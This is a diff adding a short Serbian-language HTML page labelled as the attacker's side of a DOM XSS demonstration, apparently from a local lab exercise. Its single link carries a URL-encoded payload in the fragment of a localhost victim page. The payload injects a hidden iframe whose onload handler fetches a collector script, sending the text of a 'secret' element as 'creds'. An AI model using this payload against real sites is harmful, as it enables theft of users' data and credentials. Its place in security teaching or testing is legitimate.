@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Napadač (DOM XSS)</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<h1>Napadač za DOM XSS</h1>
+
+<div class="card">
+    <a href="http://localhost/XSS/dom.html#zahtev%20uspesan%3Ciframe%20style%3D%22display%3Anone%22%20onload%3D%22fetch%28%27http%3A%2F%2Flocalhost%2FXSS%2Fdom-stolen.php%3Fcreds%3D%27%2BencodeURIComponent%28document.getElementById%28%27secret%27%29.textContent%29%29%22%3E%3C%2Fiframe%3E">
+        Otvori žrtvin URL
+    </a>
+</div>
+
+</body>
+</html>
